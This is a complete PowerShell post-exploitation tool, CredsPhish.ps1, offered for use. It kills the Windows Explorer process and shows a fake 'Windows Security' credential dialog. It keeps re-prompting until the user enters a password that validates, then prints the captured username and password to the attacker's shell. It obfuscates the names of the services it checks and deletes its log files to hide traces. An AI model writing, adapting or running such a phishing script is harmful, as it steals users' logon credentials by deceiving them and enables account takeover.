<#
.SYNOPSIS
   Promp the current user for a valid credential.

   Author: @mubix|@r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.2

.DESCRIPTION
   This CmdLet interrupts EXPLORER process until a valid credential is entered
   correctly in Windows PromptForCredential MsgBox, only them it starts EXPLORER
   process and leaks the credentials on this terminal shell (Social Engineering).

.NOTES
   Remark: CredsPhish.ps1 CmdLet its set for 30 fail validations before abort.
   Remark: CredsPhish.ps1 CmdLet requires lmhosts + lanmanserver services running.
   Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.

.Parameter PhishCreds
   Accepts Start @argument {start phishing}

.Parameter Limmit
   Aborts phishing after -Limmit [fail attempts] reached.

.EXAMPLE
   PS C:\> powershell -File CredsPhish.ps1
   Prompt the current user for a valid credential.

.EXAMPLE
   PS C:\> powershell -File CredsPhish.ps1 -Limmit 30
   Prompt the current user for a valid credential and
   Abort phishing after -Limmit [number] fail attempts.

.OUTPUTS
   Captured Credentials (LogOn)
   ----------------------------
   TimeStamp : 01/17/2021 15:26:24
   username  : r00t-3xp10it
   password  : mYs3cr3tP4ss
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$PhishCreds="Start",
   [int]$Limmit='5'
)

$PCName = $Env:COMPUTERNAME
$RawServerName = "Lanm" + "anSer" + "ver" -Join ''
$CheckCompatiblity = (Get-Service -Computer $PCName -Name $RawServerName).Status
If(-not($CheckCompatiblity -ieq "Running")){
    echo "`n[*error*] $RawServerName required service not running!" >> $Env:TMP\jhsvsj.log
    echo "[execute] Set-Service -Name `"$RawServerName`" -Status running -StartupType automatic`n" >> $Env:TMP\jhsvsj.log
    Get-Content -Path "$Env:TMP\jhsvsj.log"
    Remove-Item -Path "$Env:TMP\jhsvsj.log" -Force
    exit ## Exit @CredsPhish
}

$RawHostState = "lmh" + "os" + "ts" -Join ''
$CheckCompatiblity = (Get-Service -Computer $PCName -Name $RawHostState).Status
If(-not($CheckCompatiblity -ieq "Running")){
    echo "`n[*error*] $RawHostState required service not running!" >> $Env:TMP\jhsvsj.log
    echo "[execute] Set-Service -Name `"$RawHostState`" -Status running -StartupType automatic`n" >> $Env:TMP\jhsvsj.log
    Get-Content -Path "$Env:TMP\jhsvsj.log"
    Remove-Item -Path "$Env:TMP\jhsvsj.log" -Force
    exit ## Exit @CredsPhish
}


$account = $null
$timestamp = $null
taskkill /f /im explorer.exe

[int]$counter = 0
While($counter -lt $Limmit){## 5 fail attempts until abort (default)

  $user    = [Environment]::UserName
  $domain  = [Environment]::UserDomainName

  Add-Type -assemblyname System.Windows.Forms
  Add-Type -assemblyname System.DirectoryServices.AccountManagement
  $DC = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)

  $account = [System.Security.Principal.WindowsIdentity]::GetCurrent().name
  $credential = $host.ui.PromptForCredential("Windows Security", "Please enter your UserName and Password.", $account, "NetBiosUserName")
  $validate = $DC.ValidateCredentials($account, $credential.GetNetworkCredential().password)

    $user = $credential.GetNetworkCredential().username;
    $pass = $credential.GetNetworkCredential().password;
    If(-not($validate) -or $validate -eq $null){## Fail to validate credential input againt DC
      $logpath = Test-Path -Path "$Env:TMP\CredsPhish.log";If($logpath -eq $True){Remove-Item $Env:TMP\CredsPhish.log -Force}
      $msgbox = [System.Windows.Forms.MessageBox]::Show("Invalid Credentials, Please try again ..", "$account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
    }Else{## We got valid credentials
      $TimeStamp = Get-Date
      echo "" > $Env:TMP\CredsPhish.log
      echo "   Captured Credentials (logon)" >> $Env:TMP\CredsPhish.log
      echo "   ----------------------------" >> $Env:TMP\CredsPhish.log
      echo "   TimeStamp : $TimeStamp" >> $Env:TMP\CredsPhish.log
      echo "   username  : $user" >> $Env:TMP\CredsPhish.log
      echo "   password  : $pass" >> $Env:TMP\CredsPhish.log
      Get-Content $Env:TMP\CredsPhish.log
      Remove-Item -Path "$Env:TMP\CredsPhish.log" -Force
      Start-Process -FilePath $Env:WINDIR\explorer.exe
      exit ## Exit @CredsPhish
    }
    $counter++
}

## Clean ALL artifacts left behind
If($counter -eq $Limmit){## Internal Abort function
    ## Build Output Table
    echo "" > $Env:TMP\CredsPhish.log
    echo "   Captured Credentials (logon)" >> $Env:TMP\CredsPhish.log
    echo "   ----------------------------" >> $Env:TMP\CredsPhish.log
    echo "   Status    : Phishing Aborted!" >> $Env:TMP\CredsPhish.log
    echo "   Limmit    : $Limmit (fail validations)" >> $Env:TMP\CredsPhish.log
    Get-Content $Env:TMP\CredsPhish.log
    Remove-Item -Path "$Env:TMP\CredsPhish.log" -Force
    Start-Process -FilePath $Env:WINDIR\explorer.exe
    exit ## Exit @CredsPhish
}